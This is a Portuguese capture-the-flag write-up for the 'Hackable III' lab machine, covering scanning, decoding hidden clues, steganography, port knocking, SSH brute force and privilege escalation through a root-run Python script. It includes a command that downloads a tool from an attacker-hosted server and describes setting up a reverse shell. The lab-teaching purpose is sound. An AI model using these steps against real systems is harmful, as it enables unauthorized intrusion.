<h2>Começamos com uma varredura simples com nmap e uma varredura por diretórios.</h2>

![img](https://raw.githubusercontent.com/elias403/Write-up-s/main/images/hackable_III/1.JPG)

<h2>Lendo o código fonte, vemos uma mensagem do desenvolvedor para alguém - jubiscleudo - e mencionando sobre o port knocking, logo sabemos que tem algum serviço oculto. Também encontramos o caminho para uma página de login </h2>

![img](https://raw.githubusercontent.com/elias403/Write-up-s/main/images/hackable_III/2.JPG)

<h2>Analisando o arquivo robots.txt vemos que a pasta config não está permitada -> Disallow: /config
acessando ela temos um arquivo chamada 1.txt, usando o hashanalyser(https://www.tunnelsup.com/hash-analyzer/) sabemos que se trata de um base64, fazendo o decode temos o seguinte: 10000</h2>

![img](https://raw.githubusercontent.com/elias403/Write-up-s/main/images/hackable_III/3.JPG)
![img](https://raw.githubusercontent.com/elias403/Write-up-s/main/images/hackable_III/3.1.JPG)


<h2>Procurando nos outros diretórios(/css) encontrei o 2.txt, se trata de um Brainfuck, pesquisando por decode brainfuck encontramos algumas opções e temos como resultado 4444.</h2>

![img](https://raw.githubusercontent.com/elias403/Write-up-s/main/images/hackable_III/4.JPG)
![img](https://raw.githubusercontent.com/elias403/Write-up-s/main/images/hackable_III/4.1.JPG)

<h2>Vemos uma wordlist na pasta backup que nos será útil mais tarde</h2>

![img](https://raw.githubusercontent.com/elias403/Write-up-s/main/images/hackable_III/5.JPG)


<h2>Pesquisando um pouco sobre port knocking nota-se que por default ele vem com as portas 7000,8000,9000 (3 portas são necessárias), seguindo essa lógica temos apenas os valores 1 e 2, existem 3 formas de encontrar o 3 arquivo.</h2>

<h3>1° FORMA: Fazendo uma varredura de diretórios por extensão(os 2 primeiros eram txt, o 3° não é! por isso sempre faça uma varredura "genérica")</h3>

![img](https://raw.githubusercontent.com/elias403/Write-up-s/main/images/hackable_III/6.1.JPG)


<h3>2° FORMA: Na varredura também podemos encontar um outro arquivo html(home.html), acessando ele e vendo a fonte vemos um comentário bem explícito que existe algum arquivo.jpg que temos que buscar, isso simplificaria muito a busca</h3>

![img](https://raw.githubusercontent.com/elias403/Write-up-s/main/images/hackable_III/6.2.JPG)
![img](https://raw.githubusercontent.com/elias403/Write-up-s/main/images/hackable_III/6.2.1.JPG)


<h3>3° FORMA: Na página de login que encontramos anteriormente, tentando fazer login vemos que não acontece nada pois ainda está em desenvolvimento, porém vendo a fonte encontramos nosso 3.jpg lá!</h3>

![img](https://raw.githubusercontent.com/elias403/Write-up-s/main/images/hackable_III/6.3.JPG)


<h2>Abrindo o 3.jpg já percebe-se que se trata de esteganografia, usaremos o steghide, usando o info vemos que existe algo lá dentro, agora extraimos ele(ao pedir senha pode apenas apertar enter já que o arquivo não possui senha). Assim temos nossa última "senha: 65535"</h2>

![img](https://raw.githubusercontent.com/elias403/Write-up-s/main/images/hackable_III/7.JPG)


<h2>Usaremos o knock para "abrir" o serviço oculto, usando a mesma ordem das senhas 1-2-3, se trata de um ssh</h2>

![img](https://raw.githubusercontent.com/elias403/Write-up-s/main/images/hackable_III/8.JPG)


<h2>Agora entra a wordlist que encontramos antes, como usuário temos o jubiscleudo, faremos um brute force e entraremos via ssh</h2>

![img](https://raw.githubusercontent.com/elias403/Write-up-s/main/images/hackable_III/9.JPG)


<h2>A 1° flag está oculta, ls -la</h2>

![img](https://raw.githubusercontent.com/elias403/Write-up-s/main/images/hackable_III/10.JPG)



<h2>Dando uma olhada nos arquivos de /var/www/html conseguimos as credenciais para outro usuário</h2>

![img](https://raw.githubusercontent.com/elias403/Write-up-s/main/images/hackable_III/11.JPG)



<h2>Após fazer login no usuário hackable_3 executaremos o [pspy](link_pspy) - periodicamente  o root(UID=0) executado "python3 /scripts/to_hackable_3.py", indo até a pasta não existe o arquivo, então basta criarmos um arquivo com o mesmo caminho que será executado pelo root</h2>

<h4>
atacante: python3 -m http.server
vítima: wget http://ip_kali:8000/pspy
	chmod +x
	./pspy
</h4>

![img](https://raw.githubusercontent.com/elias403/Write-up-s/main/images/hackable_III/12.JPG)


<h2>Agora é hora da criatividade, o root está executando nosso arquivo python, no nosso caso queremos conseguir uma reverse shell para o reverse shell, usei o de python https://shellgenerator.github.io </h2>

![img](https://raw.githubusercontent.com/elias403/Write-up-s/main/images/hackable_III/13.JPG)


<h2>Deixamos nosso netcat ouvindo e aguardamos o processo executa nosso arquivo</h2>

![img](https://raw.githubusercontent.com/elias403/Write-up-s/main/images/hackable_III/14.JPG)

